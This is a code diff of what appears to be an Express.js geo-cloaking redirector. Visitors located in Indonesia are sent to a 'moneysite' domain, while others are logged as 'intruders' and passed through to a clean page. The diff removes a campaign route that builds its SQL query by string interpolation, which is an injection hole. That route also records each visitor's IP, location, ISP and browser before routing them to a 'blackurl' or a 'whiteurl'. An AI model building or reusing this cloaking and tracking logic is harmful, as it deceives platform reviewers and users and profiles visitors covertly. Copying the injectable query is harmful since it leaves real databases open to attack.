@@ -59,8 +59,10 @@ const redirectAndTrack = (request, response, next) => {
             });
           } else {
             if (country === "Indonesia") {
+              console.log("redirect moneysite");
               response.redirect(301, "https://basopetir.com");
             } else {
+              console.log("Beliau ini Penyusup");
               next();
             }
           }
@@ -83,83 +85,6 @@ app.get("/", function (request, response) {
 });
 app.get("/favicon.ico", function (request, response) {
   response.sendFile(__dirname + "/public/index.html");
-});
-
-app.get("/:campname", function (request, response) {
-  let campname = request.params.campname;
-  let sql = `SELECT * FROM links WHERE campname='${campname}' LIMIT 1`;
-  con.query(sql, function (error, result) {
-    if (error) {
-      console.error(error);
-      response.status(500).json({
-        status: "notok_1",
-        message: "OOPS! Something Went Wrong",
-      });
-    } else {
-      console.log("id valid");
-      const clientIP = request.headers["x-real-ip"] || request.headers["x-forwarded-for"] || request.connection.remoteAddress;
-      const parts = clientIP.split(":");
-      const ipv4 = parts[parts.length - 1];
-
-      fetch(`https://ifconfig.co/json?ip=${ipv4}`)
-        .then((res) => {
-          if (res.status >= 400) {
-            throw new Error("Bad response from server");
-          }
-          return res.json();
-        })
-        .then((user) => {
-          const referer = request.headers.referer;
-          const ipaddress = user.ip;
-          const country = user.country;
-          const region = user.region_name;
-          const city = user.city;
-          const user_agent = request.headers["user-agent"];
-          const isp = user.asn_org;
-          const sql = `INSERT INTO visitor (linkid, ipaddress, country, region, city, referer, browser, isp) VALUES (?, ?, ?, ?, ?, ?, ?, ?)`;
-          const redirect1 = result[0].blackurl;
-          const redirect2 = result[0].whiteurl;
-
-          con.query(
-            sql,
-            [
-              result[0].id,
-              ipaddress,
-              country,
-              region,
-              city,
-              referer,
-              user_agent,
-              isp,
-            ],
-            function (error, result) {
-              if (error) {
-                console.error(error);
-                response.status(500).json({
-                  status: "notok_2",
-                  message: "OOPS! Something Went Wrong",
-                });
-              } else {
-                console.log(user_agent);
-                console.log(country);
-                if (country === "Indonesia") {
-                  response.redirect(301, redirect1);
-                } else {
-                  response.redirect(301, redirect2);
-                }
-              }
-            }
-          );
-        })
-        .catch((err) => {
-          console.error(err);
-          response.status(500).json({
-            status: "notok_3",
-            message: "OOPS! Something Went Wrong",
-          });
-        });
-    }
-  });
 });
 
 app.all("*", (req, res) => {
